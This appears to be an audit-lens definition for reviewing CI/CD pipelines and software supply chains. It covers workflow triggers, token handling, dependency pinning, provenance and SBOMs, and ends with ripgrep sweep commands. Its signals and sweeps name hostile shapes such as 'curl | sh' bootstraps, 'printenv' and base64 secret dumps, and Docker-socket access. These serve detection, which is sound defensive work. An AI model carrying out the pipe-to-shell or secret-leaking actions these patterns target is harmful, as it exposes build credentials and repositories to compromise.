---
name: cicd-and-supply-chain
title: CI/CD pipeline and software supply chain
runs_in: fanout
activates_on:
  paths:
    - '.github/workflows/**/*.y*ml'
    - '.github/actions/**/action.y*ml'
    - '**/action.y*ml'
    - '.github/dependabot.y*ml'
    - '.github/CODEOWNERS'
    - '.gitlab-ci.yml'
    - '.gitlab/**/*.y*ml'
    - '**/Jenkinsfile*'
    - '.circleci/config.yml'
    - 'azure-pipelines*.y*ml'
    - 'bitbucket-pipelines.yml'
    - '.buildkite/**'
    - '.drone.yml'
    - 'cloudbuild.y*ml'
    - 'buildspec*.y*ml'
    - '.travis.yml'
    - 'Makefile'
    - 'Taskfile.y*ml'
    - 'scripts/**/*.sh'
    - 'ci/**'
    - '**/package.json'
    - '**/package-lock.json'
    - '**/pnpm-lock.yaml'
    - '**/yarn.lock'
    - '**/bun.lock*'
    - '**/.npmrc'
    - '**/.yarnrc.y*ml'
    - 'requirements*.txt'
    - 'pyproject.toml'
    - 'poetry.lock'
    - 'uv.lock'
    - 'Pipfile.lock'
    - 'pip.conf'
    - 'pip.ini'
    - 'go.mod'
    - 'go.sum'
    - 'Cargo.lock'
    - 'Gemfile.lock'
    - 'composer.lock'
    - 'pom.xml'
    - '**/settings.xml'
    - 'build.gradle*'
    - 'gradle/verification-metadata.xml'
    - '**/packages.lock.json'
    - '.pre-commit-config.yaml'
    - 'renovate.json*'
    - '.releaserc*'
    - '.goreleaser.y*ml'
    - 'SECURITY.md'
    - '**/*.spdx.json'
    - '**/*.cdx.json'
    - 'fastlane/Fastfile'
    - 'eas.json'
  signals:
    - 'on: pull_request_target'
    - 'on: workflow_run'
    - 'on: issue_comment'
    - 'runs-on: self-hosted'
    - '${{ github.event.'
    - '${{ github.head_ref'
    - '$GITHUB_ENV'
    - '$GITHUB_OUTPUT'
    - 'uses: actions/checkout'
    - 'persist-credentials'
    - 'uses: actions/cache'
    - 'uses: actions/upload-artifact'
    - 'secrets.GITHUB_TOKEN'
    - 'id-token: write'
    - 'permissions:'
    - 'aws-actions/configure-aws-credentials'
    - 'google-github-actions/auth'
    - 'azure/login'
    - 'docker/build-push-action'
    - 'docker/login-action'
    - 'sigstore/cosign-installer'
    - 'slsa-framework/slsa-github-generator'
    - 'pypa/gh-action-pypi-publish'
    - 'npm publish --provenance'
    - 'NPM_TOKEN'
    - 'PYPI_API_TOKEN'
    - 'NODE_AUTH_TOKEN'
    - 'npm ci'
    - '--ignore-scripts'
    - '--extra-index-url'
    - '--require-hashes'
    - '--only-binary'
    - 'curl -fsSL | sh'
    - '/var/run/docker.sock'
    - 'docker:dind'
    - '@Library('
    - 'pipeline {'
    - 'agent any'
    - 'CI_JOB_TOKEN'
    - 'CI_PIPELINE_SOURCE'
    - 'include: remote:'
    - 'masked: true'
    - 'cosign verify'
    - 'gh attestation verify'
    - 'syft / trivy / grype'
    - 'gitleaks / trufflehog'
    - 'zizmor / actionlint / poutine'
    - 'cargo build --locked'
    - 'GOFLAGS=-mod=mod'
    - 'set -x'
  evidence_classes:
    source:
      state: consumed
    built-artifact:
      state: consumed
      artifact_kinds: [dist-bundle, jar, oci-image]
      may_conclude: [secret-present-in-artifact, unexpected-artifact-content, vulnerable-component-present]
    deployed-state:
      state: not-consumed
    live-runtime:
      state: not-consumed
owns:
  - workflow-trigger-and-script-injection
  - runner-and-build-environment-trust
  - ci-secret-and-token-handling
  - ci-oidc-workflow-configuration
  - action-and-workflow-ref-pinning
  - dependency-pinning-and-lockfiles
  - dependency-confusion-and-registry-config
  - package-name-squatting
  - install-and-lifecycle-scripts
  - package-dependency-cves
  - dependency-eol-and-abandonment
  - artifact-signing-and-provenance-emission
  - sbom-generation-and-attachment
  - pipeline-scanner-gating
  - privileged-deploy-gate
  - unauthenticated-build-trigger
defers:
  webhook-handler-integrity: web-and-api
  third-party-script-integrity-sri: web-and-api
  injection-sql-nosql-orm: web-and-api
  authz-object-level: web-and-api
  iam-policy-and-privilege-scope: cloud-and-iac
  cloud-oidc-trust-policy: cloud-and-iac
  kubernetes-workload-hardening: cloud-and-iac
  dockerfile-and-image-content: cloud-and-iac
  image-cve-exposure: cloud-and-iac
  deploy-time-signature-enforcement: cloud-and-iac
  terraform-state-protection: cloud-and-iac
  encryption-at-rest-configuration: cloud-and-iac
  hmac-and-constant-time-comparison: crypto-and-key-management
  asymmetric-scheme-pitfalls: crypto-and-key-management
  hardcoded-credentials-and-key-material: crypto-and-key-management
  model-artifact-provenance: llm-and-ai
  mcp-server-trust: llm-and-ai
  ota-update-integrity: mobile-app-security
  vendored-native-code-provenance: mobile-app-security
  secrets-in-mobile-binary: mobile-app-security
  sfdx-deploy-exposure: salesforce-platform
  baa-coverage-determination: hipaa-and-phi
  phi-in-lower-environments: hipaa-and-phi
  processor-contracts-and-dpa: privacy-and-data-protection
  payment-page-script-authorization: privacy-and-data-protection
  trust-boundary-inventory: threat-modeling
  attacker-profile-model: threat-modeling
frameworks:
  - nist-ssdf
  - slsa
  - cyclonedx
  - spdx
  - owasp-top-10
  - cwe
severity_floor: low
---

## Scope

This lens audits the path a commit takes to become a running artifact: pipeline definitions and the runners that execute them, the credentials those runs hold, the third-party code they pull in, and what they publish. In scope are GitHub Actions workflows and composite/`action.yml` definitions, GitLab CI, Jenkins pipelines, CircleCI, Azure Pipelines, Bitbucket Pipelines, Buildkite, Drone, Cloud Build, CodeBuild and Travis configuration; `Makefile`, `Taskfile` and `scripts/**/*.sh` build glue; package manifests, lockfiles and registry configuration for npm/pnpm/yarn/bun, pip/uv/Poetry/Pipenv, Go, Cargo, Bundler, Composer, Maven, Gradle and NuGet; and release, signing and SBOM configuration.

Five facts drive everything below.

- **A workflow file is production code holding production credentials.** It is reviewed less than application code, it runs with a token that can write to the repository, and on many pipelines it can reach the cloud account. Treat it as the highest-privilege code in the checkout.
- **Expressions are substituted before a shell exists.** `${{ … }}` in a `run:` block is textual interpolation into the script body, performed by the runner before `bash` is invoked. Quoting inside the script cannot help, because the quote characters are part of the substituted text. The same is true of Groovy `"${…}"` in a Jenkins `sh` step and of GitLab's variable expansion into `script:`.
- **The trigger decides the trust level, not the job body.** `pull_request_target`, `workflow_run`, `issues`, `issue_comment` and `discussion_comment` run in the *base* repository's context with its secrets and its token, and can be started by anyone with an account on the forge. `pull_request` from a fork runs with no secrets and a read-only token — on a public repository, where that is not a setting anyone can change. On a private or internal repository it *is* a setting ("send secrets to workflows from fork pull requests"), so read that default as a default. Two workflows with byte-identical steps have opposite risk depending on which of those words is at the top of the file.
- **A signature attests to a publisher, not to a build.** The 3CX compromise shipped a validly signed application. Signing answers "who published this"; provenance and reproducibility answer "what went into it". Do not accept one as evidence for the other, and never treat "we sign releases" as a defense against a compromised build environment or a hijacked maintainer account.
- **Most controls in this domain are provider settings, not files.** Branch protection, required reviews, environment approvers, runner ephemerality, secret-scanning enablement and repository visibility are not in the checkout. This lens reports what the files show and writes the rest as an assumption with a verification step — see *What cannot be determined from a repository*. That section is load-bearing here in a way it is not for most lenses: a large fraction of this domain's classic checklist items are unanswerable from source, and inventing an answer in either direction is the most common way a CI/CD audit goes wrong.

**Named incidents are illustrations, not an inventory.** Where a publicly reported incident is cited below it carries a date and a single lesson, and it is there to make a mechanism concrete. Never write a finding of the form "this repository is exposed to the *X* incident"; write the mechanism you found, in this repository, with the file and the line.

### Owns

| Topic | What that means here |
|---|---|
| `workflow-trigger-and-script-injection` | Which trigger a workflow uses, whether untrusted content is checked out or executed under it, and every path by which attacker text reaches a shell — `run:` interpolation, `$GITHUB_ENV`, `$GITHUB_OUTPUT`, `$GITHUB_PATH`, GitLab `script:`, Jenkins `sh`. |
| `runner-and-build-environment-trust` | What the build executes on and alongside: self-hosted and persistent runners, container jobs, the Docker socket, the toolcache, restored caches and downloaded artifacts, and download-and-execute bootstraps. |
| `ci-secret-and-token-handling` | How secrets enter a run and how they leave it: logging and masking defeat, transforms, `env`/`printenv` dumps, secrets written to the workspace, over-broad artifact and cache paths, `secrets: inherit`, `persist-credentials`, and secrets already in git history. |
| `ci-oidc-workflow-configuration` | The pipeline half of workload identity: `id-token: write` scope and placement, the audience and role a workflow requests, and long-lived cloud keys used where a federated token would do. The cloud-side trust policy is not this lens's. |
| `action-and-workflow-ref-pinning` | Every mutable reference the pipeline resolves at run time: `uses:` refs, reusable-workflow refs, `container:` and `services:` images, GitLab `include:`, Jenkins shared libraries, CircleCI orbs, `pre-commit` `rev:`. |
| `dependency-pinning-and-lockfiles` | Whether the dependency set is fixed and whether CI installs the fixed set: lockfile presence and freshness, frozen-install verbs per ecosystem, hash pinning, and the flags that switch integrity checking off. |
| `dependency-confusion-and-registry-config` | Where package resolution can be redirected: registry and index configuration, scoping, index-priority semantics, and whether that configuration is committed and CI-enforced or lives only in a developer's home directory. |
| `package-name-squatting` | Typosquatting and slopsquatting: install commands that name a package the manifest does not, and how to check a name's identity rather than its mere existence. |
| `install-and-lifecycle-scripts` | Arbitrary code executed by the act of installing: npm lifecycle scripts, `setup.py`, and the flags and settings that suppress them. |
| `package-dependency-cves` | Known-vulnerable dependency versions, whether an advisory scanner runs, and whether an alerting and update path exists that the repository can evidence. |
| `dependency-eol-and-abandonment` | Unmaintained, deprecated and end-of-life dependencies and runtimes, single-maintainer critical paths, and the ingestion controls that blunt a maintainer account takeover. |
| `artifact-signing-and-provenance-emission` | What the pipeline emits about its own output: signatures, provenance attestations, SBOM attestations, checksums, and the SLSA Build level the pipeline is actually at. Enforcement at deploy time belongs to another lens. |
| `sbom-generation-and-attachment` | Whether an SBOM is produced, in a machine-readable format, and whether it reaches the consumer or dies in the workspace. |
| `pipeline-scanner-gating` | Whether a scanner that exists actually blocks: `continue-on-error`, `\|\| true`, `allow_failure`, soft-fail flags, zeroed exit codes, advisory-only report upload, and scanners that run only where they cannot block. |
| `privileged-deploy-gate` | What stands between a merge and production: environment references, deploy-job conditions, `CODEOWNERS` coverage of the pipeline itself, tag and release gating, and manual approval steps. |
| `unauthenticated-build-trigger` | Whether something outside the trust boundary can cause the pipeline to run: fork-PR and comment triggers, webhook trigger tokens committed to the repository, and CI systems reachable without authentication. |

### Does not own

Do not raise findings on these. Where the code shows one, record it in the candidate's `impact` as an aggravator and hand it to the owning lens with the file and the line. One defect, one finding.

- **web-and-api** — `webhook-handler-integrity`, `third-party-script-integrity-sri`, `injection-sql-nosql-orm`, `authz-object-level`. The application's webhook receiver and its signature check are theirs; what stays here is whether a *CI system* accepts a build trigger from an unauthenticated caller (`unauthenticated-build-trigger`). Likewise `third-party-script-integrity-sri` is the browser-side `integrity` attribute; the pipeline-side analogue — a build step fetching a script over the network with no checksum — is `runner-and-build-environment-trust` here.
- **cloud-and-iac** — `iam-policy-and-privilege-scope`, `cloud-oidc-trust-policy`, `kubernetes-workload-hardening`, `dockerfile-and-image-content`, `image-cve-exposure`, `deploy-time-signature-enforcement`, `terraform-state-protection`, `encryption-at-rest-configuration`. Three of these are easy to file here by accident, so they are called out:
  - **`cloud-oidc-trust-policy` is theirs.** A trust policy whose `sub` condition is missing, or wildcarded to every branch of every repository in the organization, is graded there. What stays here is the workflow side: which jobs carry `id-token: write`, what audience and role the workflow asks for, and whether a long-lived key is used instead (`ci-oidc-workflow-configuration`).
  - **`deploy-time-signature-enforcement` is theirs.** Admission control, registry policy and cloud binary-authorization services are graded there. What stays here is *emission* — whether the pipeline signs and attests at all (`artifact-signing-and-provenance-emission`) — plus verification of third-party artifacts the build itself consumes, which is build-environment trust. The "we emit provenance nobody checks" asymmetry is written up once, in this lens, with a pointer to theirs.
  - **`dockerfile-and-image-content` and `image-cve-exposure` are theirs.** The `FROM` line, the base image's contents and its CVEs are graded there. What stays here is the mutability of a reference the *pipeline* resolves — a workflow `container: image: node:20`, or a `docker://` action — under `action-and-workflow-ref-pinning`.
- **crypto-and-key-management** — `hmac-and-constant-time-comparison`, `asymmetric-scheme-pitfalls`, `hardcoded-credentials-and-key-material`. A credential literal committed to the repository is theirs, including one sitting in a workflow file. What stays here is how a secret store's value is handled once the pipeline injects it, and what the pipeline leaks.
- **llm-and-ai** — `model-artifact-provenance`, `mcp-server-trust`. Weight files and model hubs are theirs even though the trust structure is a supply-chain one.
- **mobile-app-security** — `ota-update-integrity`, `vendored-native-code-provenance`, `secrets-in-mobile-binary`. A signing key or store credential exposed *in the pipeline* is `ci-secret-and-token-handling` here; the same value shipped inside the binary is theirs.
- **salesforce-platform** — `sfdx-deploy-exposure`. Auth URLs, `.sfdx`/`.sf` directories and retrieved metadata in the repository are theirs. A Salesforce deploy *job's* gating and credential handling is this lens's.
- **hipaa-and-phi** — `baa-coverage-determination`, `phi-in-lower-environments`. Whether a CI vendor needs a BAA, and whether pipeline test data is real patient data, are decided there.
- **privacy-and-data-protection** — `processor-contracts-and-dpa`, `payment-page-script-authorization`.
- **threat-modeling** — `trust-boundary-inventory`, `attacker-profile-model`. Do not open a finding here with a threat model; state the trigger, the artifact and the line.

### Frameworks this lens may and may not cite

`nist-ssdf`, `slsa`, `cyclonedx`, `spdx`, `owasp-top-10`, `cwe`. Nothing else, and each only where an artifact in the checkout supports it.

- **NIST SSDF (SP 800-218)** — cite a practice only where the repository shows the artifact behind it. The organizational-process questions this lens inherited — "are there documented security requirements for code", "is there a threat-modeling step in the design process", "are patch SLAs documented", "is there a process for triaging reported vulnerabilities" — are **not answerable from a repository and are not findings here.** Where a report template asks for them, answer *N/A — org-level, not visible in source*. The practices that survive are the ones with files behind them: an advisory scanner and a secret scanner wired into the pipeline, a `SECURITY.md` carrying a reporting channel, provenance emission, and dependency-update automation.
- **SLSA Build Track** — use the current Build-level terminology, never the older single 0–4 model.
  - **Build L0** — no provenance and no build-integrity guarantees.
  - **Build L1** — provenance exists, so the artifact can be traced to the process that built it.
  - **Build L2** — a hosted build platform emits *signed* provenance, so a consumer can validate its authenticity.
  - **Build L3** — hardened build platform: runs cannot influence each other, and signing material is kept out of user-controlled build steps.

  Derive the target from the repository rather than importing a house policy: **L1** is adequate for an artifact never consumed outside the organization; **L2** is the minimum for anything published to a public registry or shipped to a customer; **L3** is the bar where a third party executes the artifact with elevated privilege or it carries regulatory weight. Say which of those the repository is, from evidence — a publish step to a public registry, a customer-facing installer, an image pushed to a public tag — and grade against that.
- **CycloneDX / SPDX** — name the format actually produced (`*.cdx.json`, `*.spdx.json`) rather than asserting a preference between them. Executive Order 14028 (2021) is the usual reason an SBOM is contractually required; cite it as the driver, not as a control.
- **OWASP Top 10** — `A03:2025 Software Supply Chain Failures` is the mapping anchor for this domain, superseding `A08:2021 Software and Data Integrity Failures`. A category name is not a severity.
- **CWE** — `CWE-78` (OS command injection) and `CWE-94` (code injection) for expression injection; `CWE-494` (download of code without integrity check) for unpinned fetches; `CWE-829` (inclusion of functionality from an untrusted control sphere) for unpinned refs and dependency confusion; `CWE-798` (hard-coded credentials) when routing to the crypto lens; `CWE-532` (sensitive information in a log file) for secret leakage; `CWE-1104` (use of unmaintained third-party components).
- **Do not cite ASVS.** No requirement in this lens's inherited source is traceable to an ASVS requirement identifier.
- **There is no "SANS Top 25" framework.** The list is MITRE's **CWE Top 25**; SANS co-branding ended after the 2011 edition and every edition since is a scripted, NVD-data-driven process. Where a template or a report names it, correct it rather than reproducing it.

### What cannot be determined from a repository

State each of these as an assumption with a verification step. Never as a finding, and — the direction that costs more — never as a clearance.

- **Branch and tag protection, required reviews, required status checks, signed-commit requirements.** These are repository or ruleset settings. `CODEOWNERS` shows who *would* be requested for review; it does not show that review is required, that it blocks a merge, or that administrators cannot bypass it. Verification: the repository's ruleset or branch-protection screen, or an API export committed to the repository.
- **Repository visibility.** Public versus private decides whether a self-hosted runner is a remote-code-execution invitation or an internal hygiene issue, and it is not in the checkout. Verification: the repository page. Until then grade on the persistence and privilege of the runner (see the severity table) and record visibility as the open assumption.
- **The `GITHUB_TOKEN` default permission level.** Repositories and organizations created after **February 2023** default it to read-only, and an administrator can enforce that organization-wide. Nothing in the checkout reveals the creation date or the organization policy, so a missing `permissions:` block is not evidence of an over-privileged token.
- **Fork-pull-request workflow-approval policy** ("require approval for all outside collaborators", "for first-time contributors"), and the organization-level allowed-actions policy. Both change whether an untrusted contributor can start a run at all, and neither is a file.
- **Whether fork pull requests receive secrets and a write token.** For **private and internal** repositories, GitHub exposes *Run workflows from fork pull requests*, **"Send secrets to workflows from fork pull requests"** and **"Send write tokens to workflows from fork pull requests"** as repository (or organization) settings. With those enabled, the usual invariant — a fork `pull_request` run has no secrets and a read-only token — is **false**, and every clearance built on it evaporates. Public repositories do not have these settings and the invariant holds there. Since repository visibility is itself not in the checkout, treat this as two unknowns stacked: verification is the repository's Actions settings screen, and until then the clearance in false positive 3 is conditional rather than automatic.
- **What a runner label resolves to.** Whether `runs-on: self-hosted` is an ephemeral just-in-time container or a long-lived virtual machine with a shared toolcache, a Docker socket and cached cloud credentials, is runner configuration. Ask; do not assume in either direction.
- **Environment protection rules.** `environment: production` in a workflow proves the gate is *referenced*. Required reviewers, wait timers and deployment-branch restrictions are settings behind that name. An `environment:` key is therefore evidence of intent and the start of a question, not proof of a gate.
- **Whether secret scanning, push protection or dependency alerting is enabled.** A committed `.github/dependabot.yml` proves update pull requests are configured; it says nothing about alerting. Absence of the file does not prove alerting is off.
- **Whether an internal package name is registered on a public registry.** Answering it requires querying the registry, which the hard rails forbid. Report the resolution configuration that would make it exploitable and name the query as the user's follow-up.
- **Whether a pinned commit is benign.** A 40-hex SHA proves immutability, not safety. Reviewing what a pinned action or package actually does is manual, and the class of incident where a widely used action's tags are retargeted to malicious code is defeated by pinning without being detected by it.
- **Provider behaviour: secret masking, log retention, cache-scope isolation, artifact retention, and OIDC trust-policy evaluation.** Only the provider can demonstrate these. That cuts twice: "the platform masks secrets" is not a clearance, and a cache-scope argument in either direction needs the provider's documented behaviour cited rather than inferred from a workflow file.
- **Registry account hygiene** — two-factor or hardware keys on the accounts that can publish this package, and who holds publish rights.
- **Whether a scanner's output is triaged.** A workflow proves the scan runs. Whether anyone reads the report is process.

## Activation coverage

`activates_on` is intentionally broader than the executable coverage below. `COVERED`
means a body check plus a detector or measured fixture path; `PARTIAL` means the
body supplies an actionable starting point but not provider-complete semantics;
`NOT ASSESSED` means activation must produce an explicit coverage gap, never a
clean CI/CD verdict.

| Activation family | Status | Actionable body anchor | Evidence or limit |
|---|---|---|---|
| GitHub Actions | COVERED | `workflow-trigger-and-script-injection` | fixture:V-009 |
| npm and pnpm install or lockfile paths | COVERED | `install-and-lifecycle-scripts` | detector:install-and-lifecycle-scripts |
| GitLab, Jenkins, CircleCI, Azure Pipelines, Buildkite, shell and Make glue | PARTIAL | `ci-secret-and-token-handling` | Cross-provider token, runner and shell checks exist; provider semantics are not complete |
| Other package ecosystems except Bun, plus registry configuration | PARTIAL | `dependency-pinning-and-lockfiles` | Generic lock, registry and install checks exist; ecosystem-specific resolution is uneven |
| Signing, provenance, SBOM, scanner and release configuration | PARTIAL | `artifact-signing-and-provenance-emission` | Dedicated checklist and proof recipes exist; provider-specific release behavior still needs reading |
| Bitbucket, Drone, Cloud Build, CodeBuild, Travis, Taskfile, Fastlane, EAS and Bun | NOT ASSESSED | — | These activators have no dedicated actionable body path; report the matching surface as not assessed |

## Checklist

Work the pipeline in trust order: what can start a run, what that run can reach, what it pulls in, and what it emits. Every finding names a file and a line. Where an item turns on a provider setting, produce the assumption-with-verification-step form rather than a grade.

### 0. Highest-yield sweeps

Run these first, from the repository root, and treat every hit as a candidate to trace rather than as a finding.

**Four mechanical traps come before the patterns, because every one of them makes a sweep report clean on a fully vulnerable repository.**

- **`--hidden` is not optional.** ripgrep prunes hidden *directories* during traversal, and a `--glob` does **not** override that pruning. `rg -n --glob '**/.github/workflows/*.y*ml' 'pull_request_target' .` searches **zero files** in every repository on earth. Verified. Every command below therefore carries `--hidden`, and that covers `.github/**`, `.gitlab/**`, `.circleci/**` and `.buildkite/**` alike. (A hidden file at the repository *root* that a glob names directly — `.gitlab-ci.yml`, `.npmrc`, `.travis.yml` — is searched either way. A hidden *directory* is not.)
- **The trailing `.` is not decoration.** Given no path operand, ripgrep searches the tree only when stdin is a terminal; when stdin is a *pipe* it searches **stdin instead**, which for these patterns is empty. Measured: the trigger sweep without a path operand, spawned with a piped stdin, returns **0 hits, exit 1, and zero bytes of stderr** on a tree containing every shape in this lens. So run this block from a terminal or give every command its path — a script, a notebook or an agent harness hands its children a pipe by default, and there the missing `.` is the difference between an audit and a blank page. Every command below therefore ends in an explicit `.`, with one deliberate exception: the pin sweep's **second** stage reads the first stage's output from the pipe by design and must not be given a path.
- **The path operand silences the two traps above, so the file-set self-check is mandatory, not advisory.** This is the interaction that catches people who fix the previous bullet and stop. Without a path operand a pruned or empty file set announces itself — `No files were searched` on stderr, exit **2**. Measured: **add the `.` and the same failure becomes exit 1 with zero bytes of stderr**, identical in every observable respect to "ran correctly and matched nothing". Dropping `--hidden` from a `.github`-globbed command with a `.` on the end produces a perfectly quiet clean result. The replacement alarm is the file set itself, and it must be run **before** any sweep output is believed and **once per glob family**, because it is the only thing left that distinguishes the three outcomes:

  ```bash
  for g in '.github/workflows/**' '.github/**' '.gitlab-ci.yml' '**/Jenkinsfile*' \
           '.circleci/config.yml' 'scripts/**/*.sh' '**/Dockerfile*' '**/package.json'; do
    printf '%-24s %s file(s)\n' "$g" "$(rg --files --hidden --glob "$g" . | wc -l)"
  done
  ```

  Measured, `--files` reports the same count whether stdin is a pipe or a terminal, so this check survives the condition it is checking for. Read every count before reading any hit. **A glob reporting 0 files is an empty file set, not a clean result** — on a GitHub-only repository the GitLab, Jenkins and CircleCI rows are legitimately 0 and the honest report is *not applicable*; a 0 against `.github/workflows/**` in a repository that has workflows means a flag went missing and every sweep below it is void.
- **No look-around.** ripgrep's default engine is Rust `regex`, which has none: a `(?!…)` pattern is a `regex parse error`, exit 2, no output. Where a sweep needs "matches A but not B", write it as two stages joined by a pipe, or pass `-P` on a build with PCRE2. The pin sweep below is the one that needs it.

```bash
# privileged triggers — the most load-bearing grep in this lens
rg -n --hidden --glob '**/.github/workflows/*.y*ml' \
   'pull_request_target|pull_request_review|workflow_run|issue_comment|discussion_comment|^\s*issues:' .

# untrusted content entering the workspace, under any trigger
rg -n --hidden --glob '**/.github/workflows/*.y*ml' -e 'ref:\s*\$\{\{' -e 'head\.sha|head\.ref|head_sha|head_branch' \
   -e 'refs/pull/' -e 'gh pr checkout' -e 'actions/download-artifact' -e 'action-download-artifact' .

# interpolation reaching a shell, and the workflow-command files.
# The context alternatives are deliberately NOT anchored to `run:` — `run: |` block scalars put the
# expression on a later line, and that is the dominant form in real workflows.
rg -n --hidden --glob '**/.github/workflows/**' -e '\$\{\{\s*github\.event' -e '\$\{\{\s*github\.head_ref' \
   -e 'run:.*\$\{\{' -e 'GITHUB_ENV' -e 'GITHUB_OUTPUT' -e 'GITHUB_PATH' -e 'ACTIONS_ALLOW_UNSECURE_COMMANDS' .
# the block-scalar form on its own, when you want only the expressions that reach a shell
rg -n --hidden -U --glob '**/.github/workflows/**' '(?s)run:\s*\|.*?\$\{\{\s*github\.' .

# mutable references the pipeline resolves at run time.
# Two stages, because the default engine has no look-around. Both digest forms are excluded:
# a 40-hex commit SHA and an OCI `@sha256:<64 hex>`, which is the pin item 5 tells you to adopt.
# `-o` on stage 1 is load-bearing: stage 2 drops whole LINES, so without it a trailing comment
# holding a 40-hex SHA (`uses: actions/checkout@v4 # rollback from actions/checkout@11bd719…`)
# clears the mutable ref on the same line. Measured. Stage 2 takes no path — it reads the pipe.
rg -n --hidden -o --glob '.github/**/*.y*ml' 'uses:\s*[^.\s][^@]*@\S+' . \
   | rg -v '@([0-9a-f]{40}|sha256:[0-9a-f]{64})\b'
# same ref set in one command, only on a build of rg that reports PCRE2 in `rg --version`.
# Not identical output: this form prints the whole line, comment included, which is more useful
# when a pin is being rolled back and you want to see what it was rolled back from.
#   rg -nP --hidden --glob '.github/**/*.y*ml' 'uses:\s*[^.\s][^@]*@(?!([0-9a-f]{40}|sha256:[0-9a-f]{64})\b)\S+' .
# `image:` is matched past an optional quote and without an end-anchor, because `image: "node:latest"`
# and `image: postgres:latest  # pinned later` are both common and both invisible to a `\s*$` anchor.
rg -n --hidden --glob '**/.github/workflows/*.y*ml' -e 'container:' -e 'image:\s*["'"'"']?[^\s#]+:(latest|main|master|edge)\b' .
# On a GitHub-only repository these two match nothing and, with the path operand, say nothing:
# exit 1, no stderr — measured, indistinguishable from a clean GitLab or Jenkins configuration.
# Their file-set rows in the self-check above are what tells you which it was. "Not applicable"
# and "clean" are different report lines; only the file count decides between them.
rg -n --hidden -e 'remote:' -e 'include:' --glob '.gitlab-ci.yml' --glob '.gitlab/**' .
rg -n --hidden '@Library\(' --glob '**/Jenkinsfile*' .

# token and secret surface
rg -n --hidden --glob '.github/**' -e 'permissions:' -e 'id-token:\s*write' -e 'write-all' -e 'secrets:\s*inherit' \
   -e 'persist-credentials' -e 'upload-artifact' -e 'include-hidden-files' -e 'actions/cache' .
# the four transforms item 3 names, all four of them: `set -o xtrace` is the long form of `set -x`,
# `openssl enc` without `-base64` carries no `base64` substring, and `jq` reformatting a secret is
# a different literal from the one the masker registered. Each was measured missing before.
rg -n --hidden -e 'set -[a-z]*x' -e 'set -o xtrace' -e 'printenv' -e 'base64' -e 'xxd' -e 'openssl enc' -e '\bjq\b' \
   --glob '**/.github/workflows/**' --glob 'scripts/**/*.sh' .
# secret bindings by SCOPE, which is the whole finding in item 3's env: row. Column count is NOT
# the discriminator and must not be used as one: four-space YAML is legal and common, and it puts
# a JOB-level `env:` at column 8 — exactly where a two-space file puts a STEP-level one. So this
# enumerates every binding and you read what encloses it, which is what `-B3` is for: a workflow
# binding is at column 0, a job binding sits under `jobs.<id>:` with no `- ` between them, and a
# step binding has a sibling `run:` or `uses:` at its own indentation and is the prescribed fix.
rg -n --hidden -B3 --glob '**/.github/workflows/**' '^ *env:' .
# who owns the pipeline directory. CODEOWNERS is last-match-wins, so read every rule, not just
# the ones naming .github — a bare `*` is what usually wins. The bare glob finds all three
# legal locations (repository root, .github/, docs/).
rg -n --hidden --glob 'CODEOWNERS' -e '^\s*[^#]' .

# resolution and integrity of dependencies
# `-i` and `[-_]` are deliberate, not sloppiness: pip normalises a configuration key by lowercasing
# it and replacing `_` with `-`, so `extra_index_url` and `EXTRA-INDEX-URL` in a `pip.conf` are the
# same setting as `extra-index-url` and a case-sensitive hyphen-only pattern reads them as absent.
rg -n --hidden -i -e 'extra[-_]index[-_]url' -e 'PIP_INDEX_URL' -e 'PIP_EXTRA_INDEX_URL' -e 'index[-_]url' \
   -e 'tool\.uv\.index' -e 'tool\.poetry\.source' -e 'registry=' -e '<mirror>' \
   --glob '**/.npmrc' --glob 'pip.conf' --glob 'pip.ini' --glob 'pyproject.toml' \
   --glob '**/settings.xml' --glob '**/.github/workflows/**' --glob '**/Dockerfile*' .
# install verbs: `npm i` and `npm add` are the same command as `npm install` and are what item 8's
# first pass actually names; `pip3 install` does not contain the substring `pip install`; and the
# `| sh` pipe carries arguments far more often than not (`| sh -s -- v2`, `| sudo bash`), so the
# end-anchor this line used to have made every argumented bootstrap invisible. Dockerfiles are
# globbed because items 6 and 8, row 1's upload rules and R4 all require Dockerfile contents.
rg -n --hidden -e 'npm (install|i|add)\b' -e '(pip|pip3|uv pip) install' -e '\|\s*(sudo\s+)?(sh|bash)\b' \
   --glob '**/.github/workflows/**' --glob 'scripts/**/*.sh' --glob 'Makefile' --glob '.gitlab-ci.yml' \
   --glob '**/Dockerfile*' .
# the lifecycle-script and pnpm-major controls are value reads, not presence checks (item 9).
# Workflows and Dockerfiles are globbed so the flag on the install command is visible beside the
# setting in the file — the row grading this needs both halves, and `.npmrc` alone shows one.
rg -n --hidden -e 'ignore-scripts' -e 'onlyBuiltDependencies' -e 'packageManager' \
   --glob '**/.npmrc' --glob '**/package.json' --glob '**/pnpm-workspace.y*ml' \
   --glob '**/.github/workflows/**' --glob '**/Dockerfile*' .

# gates that do not gate, at the CONFIGURATION level. `soft[-_]fail` because the action input and
# the CLI flag differ, and `--exit-code 0` because the flag form carries no colon.
rg -n --hidden -e 'continue-on-error:\s*true' -e '\|\|\s*true' -e ';\s*exit\s+0' -e 'allow_failure:\s*true' \
   -e 'soft[-_]fail' -e '(exit-code:\s*.?0|--exit-code[= ]0)' \
   --glob '**/.github/workflows/**' --glob '.gitlab-ci.yml' --glob '.circleci/config.yml' .
# and at the SHELL level, which is the class that carries item 14's High row and which the command
# above cannot see. `curl`'s missing `-f` is an ABSENCE, so this enumerates every fetch and every
# construct that can discard its status, and you read the flags — it is not a defect grep. A hit
# with `--fail` or `--retry` on it is the control working; the finding is a fetch without one.
rg -n --hidden -e '\b(curl|wget)\b' -e '\|\s*(sh|bash|jq|tar|tee)\b' \
   -e '(export|local|declare)\s+[A-Za-z_][A-Za-z_0-9]*=\$\(' \
   --glob '**/.github/workflows/**' --glob 'scripts/**/*.sh' --glob 'Makefile' --glob '.gitlab-ci.yml' .

# what the pipeline emits about itself — enumerate publishers first, then check each for the flag
rg -l --hidden -e 'npm publish' -e 'gh-action-pypi-publish' -e 'docker/build-push-action' -e 'gh release create' \
   --glob '**/.github/workflows/**' --glob '.goreleaser.y*ml' .
rg -n --hidden -e 'cosign' -e 'notation' -e 'attestations' -e 'provenance' -e 'slsa-framework' -e 'syft' -e 'sbom' \
   -e 'insecure-ignore-tlog' -e 'certificate-identity' \
   --glob '**/.github/workflows/**' --glob '.goreleaser.y*ml' .
```

Those last two commands are the shape to reach for whenever a control is opt-in: **enumerate the publishing steps first, then check each one for the flag.** Grepping for `--provenance` and finding nothing is indistinguishable from a repository that publishes nothing at all.

